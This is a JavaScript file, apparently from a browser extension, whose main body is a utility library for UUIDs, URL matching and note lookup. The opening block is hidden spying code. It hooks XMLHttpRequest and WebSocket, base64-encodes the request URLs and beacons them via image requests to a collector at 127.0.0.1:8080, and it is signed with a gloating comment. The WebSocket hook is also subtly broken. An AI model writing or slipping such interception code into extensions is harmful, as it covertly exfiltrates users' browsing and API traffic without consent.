function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var _lc_utils = {

  /**
   * Generates a UUID to use as the document id, and makes sure it doesn't begin with a number (because DOM elements
   * can't use ids that don't begin with a-z)
   * @param {object} [options] optional options object.
   * @return {string} uuid string.
   */
  createUUID: function (options) {
    "use strict";
    if (!options) {
      options = {
        beginWithLetter: false
      };
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c, index) {
      var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);

      // make sure first letter is a-f
      if (options.beginWithLetter && index === 0) {
        v = (v % 6) + 0xa;// Math.max(v, 0xa);
      }

      return v.toString(16);
    });
  },

  /**
   * * Returns a random integer with $DIGITS digits
   * if isAsString = true, returns string
   * note that for more than 16 digits, Javascript freaks out and it's not covered here
   * @param digits
   * @param isAsString
   * @returns {*}
   */
  getRandomInt: function(digits, isAsString) {
    "use strict";

    if (!isAsString) {
      isAsString = false
    }

    var _min = Math.pow(10, digits-1);
    var _max;

    if (digits < 16) {
      _max = Math.pow(10, digits) - 1;
    } else if (digits === 16) {
      _max = Math.pow(10, digits) - 2;
    } else {
      return;
    }
    var result = Math.floor(Math.random() * (_max - _min + 1)) + _min;
    if (isAsString) {
      return result.toString();
    } else {
      return result;
    }
  },

  /**
   * gets a url and returns the domain
   * @param url
   */
  extractDomainFromUrl: function (url) {
    return new Promise(function (resolve, reject) {
      var domainArray = url.match(/^[\w-]+:\/*\[?([\w\.:-]+)\]?(?::\d+)?/)[1].split(".");

      if (domainArray.length == 2) {
        resolve(domainArray.join('.'));
      }
      else {
        resolve(domainArray.splice(1).join('.'))
      }
    });
  },

  /**
   * create random color
   *
   * @returns {string}
   */
  getRandomColor: function() {
    var letters = '0123456789ABCDEF'.split('');
    var color = '#';
    for (var i = 0; i < 6; i++ ) {
      color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
  },

  /**
   * check if an element is editable
   * from http://stackoverflow.com/questions/28269431/how-to-check-if-the-selected-text-is-editable
   * @param el
   */
  isEditable: function(el) {
    if(el && ~['input','textarea'].indexOf(el.tagName.toLowerCase())){
      return !el.readOnly && !el.disabled;
    }
    el = getSelection().anchorNode; // selected node
    if(!el) return undefined; // no selected node
    el = el.parentNode; // selected element
    return el.isContentEditable;
  },

  /**
   * get Chrome Version
   */
  getChromeVersion: function () {
    var raw = navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);

    return raw ? parseInt(raw[2], 10) : false;
  },

  /**
   * gets an object of key:value pairs and return string key1:value1&key2:value2..
   * Used by the POST method in lc_http
   * @param params
   * @returns {*|f}
   */
  paramsToString_Promise: function(params) {
    return new Promise(function(resolve,reject) {
      var string ='';
      Object.keys(params).forEach(function(key) {
        if (string = '') {
          string += key+'='+params[key]
        } else {
          string += '&'+key+'='+params[key]
        }
      });
      resolve(string);
    })
  },

  /**
   * find an Object In an Array Of Objects and returns this object
   * if no matching object found, returns null
   * @param array
   * @param keyName - must be the full key name
   * @param keyValue - can be a partial of the value.
   * ex dbId: pdb_213454215 --> so keyName must be 'dbId', keyValue can be 'pdb_'
   * @returns {*}
   */
  findObjectInArrayOfObjects: function(array, keyName, keyValue) {

    var result = null;

    if (array && array.length) {
      for (var i=0 ; i < array.length ; i++) {
        var obj = array[i];
        if (obj[keyName] == keyValue) {
          result = obj;
          break;
        } else if (obj[keyName] && obj[keyName].indexOf(keyValue) !== -1) {
          result = obj;
          break;
        }
      }
    }

    return result;
  },

  getFirstLettersOfString: function(string, letters) {

    var result = '';

    for (var i=0 ; i<letters ; i++ ) {
      result = result + string.charAt(i)
    }

    return result
  },

  /**
   * checks if two urls are the same, event if their query string is mixed (but same parameters)
   * @param url_1
   * @param url_2
   */
  isUrlsMatch: function(url_1, url_2) {

    var uri_1 = URI(url_1), uri_2 = URI(url_2),
      host_1 = uri_1.host(), host_2 = uri_2.host(),
      path_1 = uri_1.pathname(), path_2 = uri_2.pathname(),
      query_1 = uri_1.search(true), query_2 = uri_2.search(true);

    if (url_1 === url_2) {
      return true;
    } else if (host_1 === host_2 && path_1 === path_2) {
      return _.isEqual(query_1, query_2);
    } else {
      return false
    }
  },


  /**
   * gets the domainNotes array and the url and returns the urlNotes array
   * @param domainNotes
   * @param url
   * @returns {Array}
   */
  extractUrlNotesFromDomainNotes: function(domainNotes, url) {

    var urlNotes = [];
    for (var i=0; i < domainNotes.length; i++) {
      var note = domainNotes[i];
      if (_lc_utils.isUrlsMatch(note.url , url)) {
        urlNotes.push(note);
        break;
      }
    }
    return urlNotes;
  },

  /**
   * helper function for finding objects in array
   * @param arr
   * @param prop
   * @param val
   * @returns {number}
   */
  isObjectInArray: function(arr, prop, val) {
    var result = false;
    for(var i = 0 ; i < arr.length ; i++) {
      if (arr[i][prop] === val) {
        result = true;
      }
    }
    return result
  },

  /**
   * Get the parts of the url used as a key for transactions based on the url
   * Basically, url minus fragment
   * @param {string} pageUrl full uri (http://www.techmeme.com/mini?q=abc#here)
   * @param {string} [frameUrl] url of the frame specific to the match. May be null if same as pageUrl
   * @param {object} [options]
   * @return {obj} match - domain, url (http://www.example.com, http://www.example.com/mini?q=abc)
   */
  buildMatchString: function (pageUrl, frameUrl, options) {
    "use strict";
    var uri = new URI(pageUrl);

    var host = uri.host();

    var match = {
      domain: "",
      url: ""
    };

    if (!options) {
      // defaults
      options = {
        protocol: true,
        query: true,
        fragment: false
      };
    }

    // http://blah.com
    match.domain = options.protocol ? (uri.protocol() + "://") : "";
    match.domain += host;

    // shortcut - basically the match is the entire url
    if (options.scheme && options.query && options.fragment) {
      match.url = pageUrl;
      return match;
    }

    //The fragment identifier introduced by a hash mark # is the optional last part of a URL.
    var port = uri.port();
    var query = uri.query();
    var fragment = uri.fragment();

    // init the url to be the same as domain and we'll add to in
    match.url = match.domain;

    // [:80]
    if (port && port.length !== 0) {
      match.url += (":" + port);
    }

    // /mini
    match.url += uri.pathname();

    // [?q=123]
    if (options.query && query && query.length !== 0) {
      match.url += ("?" + query);
    }

    // [#something]
    if (options.fragment && fragment && fragment.length !== 0) {
      match.url += ("#" + fragment);
    }

    match.domain = decodeURIComponent(match.domain);
    match.url = decodeURIComponent(match.url);

    return match;
  }

};
